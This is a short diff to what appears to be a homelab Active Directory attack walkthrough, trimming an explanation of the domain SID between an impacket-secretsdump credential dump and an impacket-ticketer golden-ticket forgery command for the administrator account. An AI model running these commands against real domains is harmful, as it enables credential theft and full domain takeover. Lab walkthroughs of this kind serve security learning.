@@ -310,7 +310,7 @@ impacket-secretsdump homelab.local/administrator:AdminPassword@10.10.10.10
 <img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a7505858-09fa-4964-91cf-477019b7e606" />
 </p>
 
-- An example is `S-1-5-21-1234567890-1234567890-1234567890` but there is another number attached after the third `1234567890` in the above SID which we can drop because that states the account's individual RID which is part of the domain SID itself. We can now forge the ticket
+- An example is `S-1-5-21-1234567890-1234567890-1234567890` and now we can now forge the ticket
 
 ```
 impacket-ticketer -aesKey <aesKey> -domain-sid <domain-sid> -domain homelab.local -user-id 500 -groups 512,513,518,519,520 administrator
